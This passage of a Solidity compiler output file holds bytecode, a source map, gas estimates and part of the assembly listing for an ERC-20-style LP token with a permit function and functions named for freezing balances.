DUP4 KECCAK256 DUP1 SLOAD PUSH1 0x1 DUP1 DUP3 ADD SWAP1 SWAP3 SSTORE DUP3 MLOAD PUSH32 0x6E71EDAE12B1B97F4D1F60370FEF10105FA2FAAE0126114A169C64845D6126C9 DUP2 DUP7 ADD MSTORE DUP1 DUP5 ADD SWAP7 SWAP1 SWAP7 MSTORE SWAP6 DUP14 AND PUSH1 0x60 DUP7 ADD MSTORE PUSH1 0x80 DUP6 ADD DUP13 SWAP1 MSTORE PUSH1 0xA0 DUP6 ADD SWAP6 SWAP1 SWAP6 MSTORE PUSH1 0xC0 DUP1 DUP6 ADD DUP12 SWAP1 MSTORE DUP2 MLOAD DUP1 DUP7 SUB SWAP1 SWAP2 ADD DUP2 MSTORE PUSH1 0xE0 DUP6 ADD DUP3 MSTORE DUP1 MLOAD SWAP1 DUP4 ADD KECCAK256 PUSH2 0x1901 PUSH1 0xF0 SHL PUSH2 0x100 DUP7 ADD MSTORE PUSH2 0x102 DUP6 ADD SWAP7 SWAP1 SWAP7 MSTORE PUSH2 0x122 DUP1 DUP6 ADD SWAP7 SWAP1 SWAP7 MSTORE DUP1 MLOAD DUP1 DUP6 SUB SWAP1 SWAP7 ADD DUP7 MSTORE PUSH2 0x142 DUP5 ADD DUP1 DUP3 MSTORE DUP7 MLOAD SWAP7 DUP4 ADD SWAP7 SWAP1 SWAP7 KECCAK256 SWAP6 DUP4 SWAP1 MSTORE PUSH2 0x162 DUP5 ADD DUP1 DUP3 MSTORE DUP7 SWAP1 MSTORE PUSH1 0xFF DUP10 AND PUSH2 0x182 DUP6 ADD MSTORE PUSH2 0x1A2 DUP5 ADD DUP9 SWAP1 MSTORE PUSH2 0x1C2 DUP5 ADD DUP8 SWAP1 MSTORE MLOAD SWAP2 SWAP4 SWAP3 PUSH2 0x1E2 DUP1 DUP3 ADD SWAP4 PUSH1 0x1F NOT DUP2 ADD SWAP3 DUP2 SWAP1 SUB SWAP1 SWAP2 ADD SWAP1 DUP6 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x622 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP PUSH1 0x40 MLOAD PUSH1 0x1F NOT ADD MLOAD SWAP2 POP POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 AND ISZERO DUP1 ISZERO SWAP1 PUSH2 0x658 JUMPI POP DUP9 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND EQ JUMPDEST PUSH2 0x6A9 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1A PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x50616E63616B653A20494E56414C49445F5349474E4154555245000000000000 PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH2 0x6B4 DUP10 DUP10 DUP10 PUSH2 0x6DC JUMP JUMPDEST POP POP POP POP POP POP POP POP POP JUMP JUMPDEST PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x0 SWAP3 DUP4 MSTORE PUSH1 0x40 DUP1 DUP5 KECCAK256 SWAP1 SWAP2 MSTORE SWAP1 DUP3 MSTORE SWAP1 KECCAK256 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP1 DUP5 AND PUSH1 0x0 DUP2 DUP2 MSTORE PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 SWAP5 DUP8 AND DUP1 DUP5 MSTORE SWAP5 DUP3 MSTORE SWAP2 DUP3 SWAP1 KECCAK256 DUP6 SWAP1 SSTORE DUP2 MLOAD DUP6 DUP2 MSTORE SWAP2 MLOAD PUSH32 0x8C5BE1E5EBEC7D5BD14F71427D1E84F3DD0314C0F7B2291E5B200AC8C7C3B925 SWAP3 DUP2 SWAP1 SUB SWAP1 SWAP2 ADD SWAP1 LOG3 POP POP POP JUMP JUMPDEST DUP1 DUP3 SUB DUP3 DUP2 GT ISZERO PUSH2 0x385 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x15 PUSH1 0x24 DUP3 ADD MSTORE PUSH21 0x64732D6D6174682D7375622D756E646572666C6F77 PUSH1 0x58 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD PUSH2 0x7B7 SWAP1 DUP3 PUSH4 0xFFFFFFFF PUSH2 0x73E AND JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP1 DUP6 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x40 DUP1 DUP3 KECCAK256 SWAP4 SWAP1 SWAP4 SSTORE SWAP1 DUP5 AND DUP2 MSTORE KECCAK256 SLOAD PUSH2 0x7EC SWAP1 DUP3 PUSH4 0xFFFFFFFF PUSH2 0x848 AND JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP1 DUP5 AND PUSH1 0x0 DUP2 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 SWAP2 DUP3 SWAP1 KECCAK256 SWAP5 SWAP1 SWAP5 SSTORE DUP1 MLOAD DUP6 DUP2 MSTORE SWAP1 MLOAD SWAP2 SWAP4 SWAP3 DUP8 AND SWAP3 PUSH32 0xDDF252AD1BE2C89B69C2B068FC378DAA952BA7F163C4A11628F55A4DF523B3EF SWAP3 SWAP2 DUP3 SWAP1 SUB ADD SWAP1 LOG3 POP POP POP JUMP JUMPDEST DUP1 DUP3 ADD DUP3 DUP2 LT ISZERO PUSH2 0x385 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x14 PUSH1 0x24 DUP3 ADD MSTORE PUSH20 0x64732D6D6174682D6164642D6F766572666C6F77 PUSH1 0x60 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT INVALID LOG2 PUSH6 0x627A7A723158 KECCAK256 0x5F 0x24 0xF6 LOG3 INVALID PC 0xEC SWAP9 SWAP2 0xAD 0xDF PUSH27 0xA87A0A838A4CE532EC73425D05FAE792E93D66F64736F6C634300 SDIV LT STOP ORIGIN ",
							"sourceMap": "139:4344:0:-;;;;8:9:-1;5:2;;;30:1;27;20:12;5:2;139:4344:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;217:39;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;8:100:-1;33:3;30:1;27:10;8:100;;;90:11;;;84:18;71:11;;;64:39;52:2;45:10;8:100;;;12:14;217:39:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;2852:147;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;-1:-1;;;;;;2852:147:0;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;349:26;;;:::i;:::-;;;;;;;;;;;;;;;;3150:361;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;-1:-1;;;;;;3150:361:0;;;;;;;;;;;;;;;;;:::i;698:116::-;;;:::i;308:35::-;;;:::i;:::-;;;;;;;;;;;;;;;;;;;557:31;;;:::i;501:49::-;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;-1:-1;501:49:0;-1:-1:-1;;;;;501:49:0;;:::i;381:44::-;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;-1:-1;381:44:0;-1:-1:-1;;;;;381:44:0;;:::i;820:41::-;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;-1:-1;820:41:0;-1:-1:-1;;;;;820:41:0;;:::i;262:40::-;;;:::i;3005:139::-;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;-1:-1;;;;;;3005:139:0;;;;;;;;:::i;3517:964::-;;;;;;13:3:-1;8;5:12;2:2;;;30:1;27;20:12;2:2;-1:-1;;;;;;3517:964:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;431:64;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;-1:-1;;;;;;431:64:0;;;;;;;;;;:::i;217:39::-;;;;;;;;;;;;;;-1:-1:-1;;;217:39:0;;;;:::o;2852:147::-;2919:4;2935:36;2944:10;2956:7;2965:5;2935:8;:36::i;:::-;-1:-1:-1;2988:4:0;2852:147;;;;;:::o;349:26::-;;;;:::o;3150:361::-;-1:-1:-1;;;;;3281:15:0;;3261:4;3281:15;;;:9;:15;;;;;;;;3297:10;3281:27;;;;;;;;-1:-1:-1;;3281:42:0;3277:171;;-1:-1:-1;;;;;3369:15:0;;;;;;:9;:15;;;;;;;;3385:10;3369:27;;;;;;;;:68;;3418:5;3369:68;:31;:68;:::i;:::-;-1:-1:-1;;;;;3339:15:0;;;;;;:9;:15;;;;;;;;3355:10;3339:27;;;;;;;:98;3277:171;3457:26;3467:4;3473:2;3477:5;3457:9;:26::i;:::-;-1:-1:-1;3500:4:0;3150:361;;;;;:::o;698:116::-;748:66;698:116;:::o;308:35::-;341:2;308:35;:::o;557:31::-;;;;:::o;501:49::-;;;;;;;;;;;;;:::o;381:44::-;;;;;;;;;;;;;:::o;820:41::-;;;;;;;;;;;;;:::o;262:40::-;;;;;;;;;;;;;;-1:-1:-1;;;262:40:0;;;;:::o;3005:139::-;3068:4;3084:32;3094:10;3106:2;3110:5;3084:9;:32::i;3517:964::-;3730:15;3718:8;:27;;3710:56;;;;;-1:-1:-1;;;3710:56:0;;;;;;;;;;;;-1:-1:-1;;;3710:56:0;;;;;;;;;;;;;;;3878:16;;-1:-1:-1;;;;;4115:13:0;;;3776:14;4115:13;;;:6;:13;;;;;;;;:15;;;;;;;;;3943:243;;748:66;3943:243;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;26:21:-1;;;22:32;;;6:49;;3943:243:0;;;;;3912:292;;;;;;-1:-1:-1;;;3816:402:0;;;;;;;;;;;;;;;;;;;;;26:21:-1;;;22:32;;;6:49;;3816:402:0;;;;;;3793:435;;;;;;;;;4265:26;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;3776:14;;4115:15;4265:26;;;;;-1:-1:-1;;4265:26:0;;;;;;;;;;4115:15;4265:26;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;-1:-1;;4265:26:0;;-1:-1:-1;;4265:26:0;;;-1:-1:-1;;;;;;;4322:30:0;;;;;;:59;;;4376:5;-1:-1:-1;;;;;4356:25:0;:16;-1:-1:-1;;;;;4356:25:0;;4322:59;4301:132;;;;;-1:-1:-1;;;4301:132:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;4443:31;4452:5;4459:7;4468:5;4443:8;:31::i;:::-;3517:964;;;;;;;;;:::o;431:64::-;;;;;;;;;;;;;;;;;;;;;;;;:::o;2452:169::-;-1:-1:-1;;;;;2535:16:0;;;;;;;:9;:16;;;;;;;;:25;;;;;;;;;;;;;:33;;;2583:31;;;;;;;;;;;;;;;;;2452:169;;;:::o;339:136:8:-;431:5;;;426:16;;;;418:50;;;;;-1:-1:-1;;;418:50:8;;;;;;;;;;;;-1:-1:-1;;;418:50:8;;;;;;;;;;;;;;2627:219:0;-1:-1:-1;;;;;2723:15:0;;;;;;:9;:15;;;;;;:26;;2743:5;2723:26;:19;:26;:::i;:::-;-1:-1:-1;;;;;2705:15:0;;;;;;;:9;:15;;;;;;:44;;;;2775:13;;;;;;;:24;;2793:5;2775:24;:17;:24;:::i;:::-;-1:-1:-1;;;;;2759:13:0;;;;;;;:9;:13;;;;;;;;;:40;;;;2814:25;;;;;;;2759:13;;2814:25;;;;;;;;;;;;;2627:219;;;:::o;198:135:8:-;290:5;;;285:16;;;;277:49;;;;;-1:-1:-1;;;277:49:8;;;;;;;;;;;;-1:-1:-1;;;277:49:8;;;;;;;;;;;;;"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "450400",
								"executionCost": "infinite",
								"totalCost": "infinite"
							},
							"external": {
								"DOMAIN_SEPARATOR()": "1087",
								"PERMIT_TYPEHASH()": "243",
								"_frozenBalance(address)": "1147",
								"allowance(address,address)": "1305",
								"approve(address,uint256)": "22366",
								"balanceOf(address)": "1169",
								"decimals()": "274",
								"name()": "infinite",
								"nonces(address)": "1191",
								"permit(address,address,uint256,uint256,uint8,bytes32,bytes32)": "infinite",
								"symbol()": "infinite",
								"totalSupply()": "1066",
								"transfer(address,uint256)": "infinite",
								"transferFrom(address,address,uint256)": "infinite"
							},
							"internal": {
								"_approve(address,address,uint256)": "infinite",
								"_burn(address,uint256)": "infinite",
								"_mint(address,uint256)": "infinite",
								"_transfer(address,address,uint256)": "infinite",
								"freezeMint(address,uint256)": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 139,
									"end": 4483,
									"name": "PUSH",
									"value": "80"
								},
								{
									"begin": 139,
									"end": 4483,
									"name": "PUSH",
									"value": "40"
								},
								{
									"begin": 139,
									"end": 4483,
									"name": "MSTORE"
								},
								{
									"begin": 1059,
									"end": 1544,
									"name": "CALLVALUE"
								},
								{
									"begin": 8,
									"end": 17,
									"name": "DUP1"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "ISZERO"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "PUSH [tag]",
									"value": "1"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "JUMPI"
								},
								{
									"begin": 30,
									"end": 31,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 27,
									"end": 28,
									"name": "DUP1"
								},
								{
									"begin": 20,
									"end": 32,
									"name": "REVERT"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "tag",
									"value": "1"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "JUMPDEST"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "POP"
								},
								{
									"begin": 1245,
									"end": 1378,
									"name": "PUSH",
									"value": "40"
								},
								{
									"begin": 1245,
									"end": 1378,
									"name": "MLOAD"
								},
								{
									"begin": 1149,
									"end": 1156,
									"name": "CHAINID"
								},
								{
									"begin": 1149,
									"end": 1156,
									"name": "SWAP1"
								},
								{
									"begin": 1245,
									"end": 1378,
									"name": "DUP1"
								},
								{
									"begin": 1245,
									"end": 1378,
									"name": "PUSH",
									"value": "52"
								},
								{
									"begin": 1245,
									"end": 1378,
									"name": "PUSH data",
									"value": "8B73C3C69BB8FE3D512ECC4CF759CC79239F7B179B0FFACAA9A75D522B39400F"
								},
								{
									"begin": 1245,
									"end": 1378,
									"name": "DUP3"
								},
								{
									"begin": 1245,
									"end": 1378,
									"name": "CODECOPY"
								},
								{
									"begin": 1245,
									"end": 1378,
									"name": "PUSH",
									"value": "40"
								},
								{
									"begin": 1245,
									"end": 1378,
									"name": "DUP1"
								},
								{
									"begin": 1245,
									"end": 1378,
									"name": "MLOAD"
								},
								{
									"begin": 1245,
									"end": 1378,
									"name": "SWAP2"
								},
								{
									"begin": 1245,
									"end": 1378,
									"name": "DUP3"
								},
								{
									"begin": 1245,
									"end": 1378,
									"name": "SWAP1"
								},
								{
									"begin": 1245,
									"end": 1378,
									"name": "SUB"
								},
								{
									"begin": 1245,
									"end": 1378,
									"name": "PUSH",
									"value": "52"
								},
								{
									"begin": 1245,
									"end": 1378,
									"name": "ADD"
								},
								{
									"begin": 1245,
									"end": 1378,
									"name": "DUP3"
								},
								{
									"begin": 1245,
									"end": 1378,
									"name": "KECCAK256"
								},
								{
									"begin": 1412,
									"end": 1416,
									"name": "DUP3"
								},
								{
									"begin": 1412,
									"end": 1416,
									"name": "DUP3"
								},
								{
									"begin": 1412,
									"end": 1416,
									"name": "ADD"
								},
								{
									"begin": 1412,
									"end": 1416,
									"name": "DUP3"
								},
								{
									"begin": 1412,
									"end": 1416,
									"name": "MSTORE"
								},
								{
									"begin": 1412,
									"end": 1416,
									"name": "PUSH",
									"value": "7"
								},
								{
									"begin": 1412,
									"end": 1416,
									"name": "DUP4"
								},
								{
									"begin": 1412,
									"end": 1416,
									"name": "MSTORE"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "PUSH",
									"value": "4B4243204C5073"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "PUSH",
									"value": "C8"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "SHL"
								},
								{
									"begin": 1412,
									"end": 1416,
									"name": "PUSH",
									"value": "20"
								},
								{
									"begin": 1412,
									"end": 1416,
									"name": "SWAP4"
								},
								{
									"begin": 1412,
									"end": 1416,
									"name": "DUP5"
								},
								{
									"begin": 1412,
									"end": 1416,
									"name": "ADD"
								},
								{
									"begin": 1412,
									"end": 1416,
									"name": "MSTORE"
								},
								{
									"begin": 1446,
									"end": 1456,
									"name": "DUP2"
								},
								{
									"begin": 1446,
									"end": 1456,
									"name": "MLOAD"
								},
								{
									"begin": 1446,
									"end": 1456,
									"name": "DUP1"
								},
								{
									"begin": 1446,
									"end": 1456,
									"name": "DUP4"
								},
								{
									"begin": 1446,
									"end": 1456,
									"name": "ADD"
								},
								{
									"begin": 1446,
									"end": 1456,
									"name": "DUP4"
								},
								{
									"begin": 1446,
									"end": 1456,
									"name": "MSTORE"
								},
								{
									"begin": 1446,
									"end": 1456,
									"name": "PUSH",
									"value": "1"
								},
								{
									"begin": 1446,
									"end": 1456,
									"name": "DUP2"
								},
								{
									"begin": 1446,
									"end": 1456,
									"name": "MSTORE"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "PUSH",
									"value": "31"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "PUSH",
									"value": "F8"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "SHL"
								},
								{
									"begin": 1446,
									"end": 1456,
									"name": "SWAP1"
								},
								{
									"begin": 1446,
									"end": 1456,
									"name": "DUP5"
								},
								{
									"begin": 1446,
									"end": 1456,
									"name": "ADD"
								},
								{
									"begin": 1446,
									"end": 1456,
									"name": "MSTORE"
								},
								{
									"begin": 1217,
									"end": 1527,
									"name": "DUP2"
								},
								{
									"begin": 1217,
									"end": 1527,
									"name": "MLOAD"
								},
								{
									"begin": 1217,
									"end": 1527,
									"name": "DUP1"
								},
								{
									"begin": 1217,
									"end": 1527,
									"name": "DUP5"
								},
								{
									"begin": 1217,
									"end": 1527,
									"name": "ADD"
								},
								{
									"begin": 1217,
									"end": 1527,
									"name": "SWAP2"
								},
								{
									"begin": 1217,
									"end": 1527,
									"name": "SWAP1"
								},
								{
									"begin": 1217,
									"end": 1527,
									"name": "SWAP2"
								},
								{
									"begin": 1217,
									"end": 1527,
									"name": "MSTORE"
								},
								{
									"begin": 1396,
									"end": 1418,
									"name": "PUSH",
									"value": "6A36D39F32C2225411D16C8F56813B9117E6EB8BF3D2893C5FC62411565CFCFE"
								},
								{
									"begin": 1217,
									"end": 1527,
									"name": "DUP2"
								},
								{
									"begin": 1217,
									"end": 1527,
									"name": "DUP4"
								},
								{
									"begin": 1217,
									"end": 1527,
									"name": "ADD"
								},
								{
									"begin": 1217,
									"end": 1527,
									"name": "MSTORE"
								},
								{
									"begin": 1436,
									"end": 1457,
									"name": "PUSH",
									"value": "C89EFDAA54C0F20C7ADF612882DF0950F5A951637E0307CDCB4C672F298B8BC6"
								},
								{
									"begin": 1217,
									"end": 1527,
									"name": "PUSH",
									"value": "60"
								},
								{
									"begin": 1217,
									"end": 1527,
									"name": "DUP3"
								},
								{
									"begin": 1217,
									"end": 1527,
									"name": "ADD"
								},
								{
									"begin": 1217,
									"end": 1527,
									"name": "MSTORE"
								},
								{
									"begin": 1217,
									"end": 1527,
									"name": "PUSH",
									"value": "80"
								},
								{
									"begin": 1217,
									"end": 1527,
									"name": "DUP2"
								},
								{
									"begin": 1217,
									"end": 1527,
									"name": "ADD"
								},
								{
									"begin": 1217,
									"end": 1527,
									"name": "SWAP5"
								},
								{
									"begin": 1217,
									"end": 1527,
									"name": "SWAP1"
								},
								{
									"begin": 1217,
									"end": 1527,
									"name": "SWAP5"
								},
								{
									"begin": 1217,
									"end": 1527,
									"name": "MSTORE"
								},
								{
									"begin": 1508,
									"end": 1512,
									"name": "ADDRESS"
								},
								{
									"begin": 1217,
									"end": 1527,
									"name": "PUSH",
									"value": "A0"
								},
								{
									"begin": 1217,
									"end": 1527,
									"name": "DUP1"
								},
								{
									"begin": 1217,
									"end": 1527,
									"name": "DUP7"
								},
								{
									"begin": 1217,
									"end": 1527,
									"name": "ADD"
								},
								{
									"begin": 1217,
									"end": 1527,
									"name": "SWAP2"
								},
								{
									"begin": 1217,
									"end": 1527,
									"name": "SWAP1"
								},
								{
									"begin": 1217,
									"end": 1527,
									"name": "SWAP2"
								},
								{
									"begin": 1217,
									"end": 1527,
									"name": "MSTORE"
								},
								{
									"begin": 1217,
									"end": 1527,
									"name": "DUP2"
								},
								{
									"begin": 1217,
									"end": 1527,
									"name": "MLOAD"
								},
								{
									"begin": 26,
									"end": 47,
									"name": "DUP1"
								},
								{
									"begin": 26,
									"end": 47,
									"name": "DUP7"
								},
								{
									"begin": 26,
									"end": 47,
									"name": "SUB"
								},
								{
									"begin": 22,
									"end": 54,
									"name": "SWAP1"
								},
								{
									"begin": 22,
									"end": 54,
									"name": "SWAP2"
								},
								{
									"begin": 22,
									"end": 54,
									"name": "ADD"
								},
								{
									"begin": 6,
									"end": 55,
									"name": "DUP2"
								},
								{
									"begin": 6,
									"end": 55,
									"name": "MSTORE"
								},
								{
									"begin": 1217,
									"end": 1527,
									"name": "PUSH",
									"value": "C0"
								},
								{
									"begin": 1217,
									"end": 1527,
									"name": "SWAP1"
								},
								{
									"begin": 1217,
									"end": 1527,
									"name": "SWAP5"
								},
								{
									"begin": 1217,
									"end": 1527,
									"name": "ADD"
								},
								{
									"begin": 1217,
									"end": 1527,
									"name": "SWAP1"
								},
								{
									"begin": 1217,
									"end": 1527,
									"name": "MSTORE"
								},
								{
									"begin": 1194,
									"end": 1537,
									"name": "DUP3"
								},
								{
									"begin": 1194,
									"end": 1537,
									"name": "MLOAD"
								},
								{
									"begin": 1194,
									"end": 1537,
									"name": "SWAP3"
								},
								{
									"begin": 1194,
									"end": 1537,
									"name": "ADD"
								},
								{
									"begin": 1194,
									"end": 1537,
									"name": "SWAP2"
								},
								{
									"begin": 1194,
									"end": 1537,
									"name": "SWAP1"
								},
								{
									"begin": 1194,
									"end": 1537,
									"name": "SWAP2"
								},
								{
									"begin": 1194,
									"end": 1537,
									"name": "KECCAK256"
								},
								{
									"begin": 1175,
									"end": 1191,
									"name": "PUSH",
									"value": "4"
								},
								{
									"begin": 1175,
									"end": 1537,
									"name": "SSTORE"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "POP"
								},
								{
									"begin": 139,
									"end": 4483,
									"name": "PUSH #[$]",
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 139,
									"end": 4483,
									"name": "DUP1"
								},
								{
									"begin": 139,
									"end": 4483,
									"name": "PUSH [$]",
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 139,
									"end": 4483,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 139,
									"end": 4483,
									"name": "CODECOPY"
								},
								{
									"begin": 139,
									"end": 4483,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 139,
									"end": 4483,
									"name": "RETURN"
								}
							],
							".data": {
								"0": {
									".auxdata": "a265627a7a723158205f24f6a3fe58ec9891addf7a0a87a0a838a4ce532ec73425d05fae792e93d66f64736f6c63430005100032",
									".code": [
										{
											"begin": 139,
											"end": 4483,
											"name": "PUSH",
											"value": "80"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "MSTORE"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "CALLVALUE"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "POP"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "LT"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "PUSH [tag]",
											"value": "2"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "JUMPI"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "SHR"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "DUP1"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "PUSH",
											"value": "47D5D856"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "GT"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "PUSH [tag]",
											"value": "17"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "JUMPI"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "DUP1"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "PUSH",
											"value": "95D89B41"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "GT"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "PUSH [tag]",
											"value": "18"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "JUMPI"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "DUP1"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "PUSH",
											"value": "95D89B41"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "EQ"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "PUSH [tag]",
											"value": "13"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "JUMPI"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "DUP1"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "PUSH",
											"value": "A9059CBB"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "EQ"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "PUSH [tag]",
											"value": "14"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "JUMPI"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "DUP1"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "PUSH",
											"value": "D505ACCF"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "EQ"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "PUSH [tag]",
											"value": "15"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "JUMPI"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "DUP1"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "PUSH",
											"value": "DD62ED3E"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "EQ"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "PUSH [tag]",
											"value": "16"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "JUMPI"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "PUSH [tag]",
											"value": "2"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "JUMP"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "tag",
											"value": "18"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "JUMPDEST"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "DUP1"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "PUSH",
											"value": "47D5D856"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "EQ"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "PUSH [tag]",
											"value": "10"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "JUMPI"
										},
										{
